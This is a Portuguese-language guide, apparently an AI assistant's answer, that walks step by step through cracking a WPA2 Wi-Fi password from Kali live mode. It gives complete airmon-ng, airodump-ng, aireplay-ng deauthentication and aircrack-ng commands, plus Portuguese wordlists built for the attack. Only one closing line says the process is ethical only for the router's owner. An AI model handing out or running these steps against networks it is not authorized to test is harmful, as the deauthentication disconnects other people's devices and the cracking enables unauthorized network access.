### 🔧 **Etapas para Recuperar a Senha WPA2**

#### **1. Ativar o Modo Monitoramento na Interface Wireless**
No modo live, primeiro identifique sua interface wireless (geralmente `wlan0` ou `wlan1`):
```bash
iwconfig
```
Se necessário, liste todas as interfaces:
```bash
airmon-ng
```
Mate processos que possam interferir:
```bash
airmon-ng check kill
```
Ative o modo monitoramento (substitua `wlan0` pelo nome da sua interface):
```bash
airmon-ng start wlan0
```
A nova interface de monitoramento geralmente será `wlan0mon`. Verifique:
```bash
iwconfig
```

#### **2. Capturar o Handshake WPA2**
Use `airodump-ng` para capturar o handshake, especificando o BSSID (MAC do roteador) e o canal:
```bash
airodump-ng -c <canal> --bssid <MAC_DO_ROTEADOR> -w /tmp/capture wlan0mon
```
Exemplo:
```bash
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w /tmp/capture wlan0mon
```
- `-c`: canal do roteador.
- `--bssid`: MAC do roteador.
- `-w /tmp/capture`: salva os arquivos de captura em `/tmp` (volátil, mas adequado para modo live).
- `wlan0mon`: interface em modo monitoramento.

#### **3. Forçar um Deauthentication para Obter o Handshake**
Para acelerar a captura do handshake, force uma desautenticação de clientes conectados (isso desconecta dispositivos temporariamente, mas eles reconectarão automaticamente). Em um novo terminal:
```bash
aireplay-ng -0 10 -a <MAC_DO_ROTEADOR> wlan0mon
```
- `-0`: modo deauthentication.
- `10`: número de pacotes de desautenticação (ajuste conforme necessário).
- `-a`: MAC do roteador alvo.

Aguarde até ver `WPA handshake` no canto superior direito do terminal onde `airodump-ng` está rodando. Depois, pressione `Ctrl+C` para interromper a captura.

#### **4. Preparar um Dicionário em Português do Brasil**
Como a senha está em português, use ou crie um dicionário com palavras comuns em português. No modo live, você pode:
- Usar dicionários existentes no Kali (ex: `/usr/share/wordlists/`).
- Criar um dicionário personalizado com palavras em português.

Exemplo de dicionários disponíveis no Kali:
```bash
ls /usr/share/wordlists/
```
Alguns arquivos comuns: `rockyou.txt.gz` (descompacte com `gzip -d /usr/share/wordlists/rockyou.txt.gz`), `sqlmap.txt`, etc.

Como o Kali live não tem persistência, você pode baixar um dicionário em português antecipadamente e salvar em um pendrive, ou criar um manualmente. Exemplo de criação básica:
```bash
echo -e "senha\\n123456\\nbrasil\\nroteador\\nadmin\\npassword\\nwifisegura" > /tmp/wordlist_ptbr.txt
```
Para um dicionário mais robusto, considere usar listas como:
- **BruteForce wordlist** (já inclui termos em português).
- **Custom wordlist** com palavras comuns em PT-BR (ex: nomes, cidades, palavras comuns).

💡 *Dica: Se tiver outro roteador com internet, você pode baixar wordlists grandes, mas não é necessário para o processo de cracking.*

#### **5. Quebrar a Senha com Aircrack-ng**
Use `aircrack-ng` para testar o dicionário contra o handshake capturado:
```bash
aircrack-ng -a2 -b <MAC_DO_ROTEADOR> -w /tmp/wordlist_ptbr.txt /tmp/capture-01.cap
```
- `-a2`: indica WPA2.
- `-b`: MAC do roteador.
- `-w`: caminho para o arquivo de dicionário.
- `/tmp/capture-01.cap`: arquivo de captura (o número pode variar).

Se o dicionário contiver a senha, você verá:
```
KEY FOUND! [ senha_recovered ]
```
Caso contrário, tente com outro dicionário.

---

### ⚙️ **Otimizações para Modo Live**
- Como o modo live não salva dados após desligar, trabalhe na pasta `/tmp` (que é em RAM).
- Se possível, use um pendrive com persistência para salvar capturas e wordlists grandes.
- Para melhor performance, use dicionários focados em PT-BR. Exemplos:
  - [**BruteForce wordlist**](https://github.com/jeanphorn/wordlist) (inclui termos em português).
  - [**SecLists**](https://github.com/danielmiessler/SecLists) (contém listas em múltiplos idiomas).

---

### ❌ **Se Não Funcionar**
- Se o handshake não for capturado, repita o passo de deauthentication.
- Aumente o número de pacotes de deauthentication (ex: `-0 20`).
- Verifique se a interface está realmente em modo monitoramento (`iwconfig`).
- Use um dicionário maior ou mais específico.

---

### 📌 **Exemplo de Comandos em Sequência**
```bash
# Ativar modo monitoramento
airmon-ng check kill
airmon-ng start wlan0

# Capturar handshake (canal 6, BSSID 00:11:22:33:44:55)
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w /tmp/capture wlan0mon

# Em outro terminal: forçar deauthentication
aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0mon

# Quebrar senha com dicionário PT-BR
aircrack-ng -a2 -b 00:11:22:33:44:55 -w /tmp/wordlist_ptbr.txt /tmp/capture-01.cap
```

---

### 🌐 **Precisa de Internet?**
**Não.** Todo o processo é offline após ativar o modo monitoramento. A captura do handshake e o cracking são feitos localmente. A internet só seria útil para baixar wordlists adicionais, mas não é essencial.

---

### ✅ **Dicionário Sugerido para PT-BR**
Crie um arquivo `/tmp/wordlist_ptbr.txt` com palavras comuns:
```bash
echo -e "senha\\n123456\\nbrasil\\nroteador\\nadmin\\npassword\\nwifisegura\\nminhasenha\\nseguranca\\n123456789\\nquerty\\nmeuroteador\\nnovasenha\\nsenha123" > /tmp/wordlist_ptbr.txt
```
Para listas mais completas, busque por "wordlist portuguese" no GitHub ou use tools como `crunch` para gerar combinações personalizadas.

---

### 🧠 **Notas Finais**
- Esse processo é ético apenas se você for o proprietário do roteador.
- No modo live, tudo é perdido ao desligar. Use persistência ou salve em mídia externa se precisar manter dados.
- O tempo de cracking depende do tamanho do dicionário e da complexidade da senha.

Se seguir esses passos, chances são de que recupere a senha! 🔓
